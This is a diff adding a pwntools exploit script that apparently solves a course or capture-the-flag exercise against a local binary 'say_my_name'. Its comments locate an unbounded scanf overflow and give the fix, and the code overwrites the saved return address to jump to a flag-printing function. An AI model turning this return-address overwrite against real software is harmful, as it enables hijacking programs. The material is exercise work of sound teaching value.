@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./say_my_name", checksec=False)
+context.log_level = "error"
+
+# Explain here:
+# - where the bug in the binary `say_my_name` is located
+# in welcomeMe we use scanf without a length constraint 
+# ==> we could write as many bytes as we want
+# ==> so we can override the return addr of that function to for example getTheFlag 
+# Addr of getTheFlag can be seen with readelf -s say_my_name 
+# - how it can be fixed
+# just use scanf("%Xs") where X is the sizeof the Buffer 
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+def main():
+    io = start()
+    # add your exploit code here
+    
+    # First fill the buffer with useless Stuff, so we can override the saved rip on the Stack
+    # 'gaaa' was tested with gdb and cyclic 100 ;) (cyclic 100 > temp.txt; gdb say_my_name; r < temp.txt)
+    filler = cyclic(cyclic_find('gaaa'))
+    # payload is a static addr. from readelf -s | grep welcomeMe (in little endian of course)
+    payload = p32(0x080491a0)
+
+    # Get the Output + overflow return addr to welcomeMe
+    io.recv()
+    io.sendline(filler + payload)
+    io.recv()
+    
+    # Just print the solution string
+    sol = io.recv()
+    print(sol.decode('utf-8')[:-1])
+
+
+if __name__ == "__main__":
+    main()
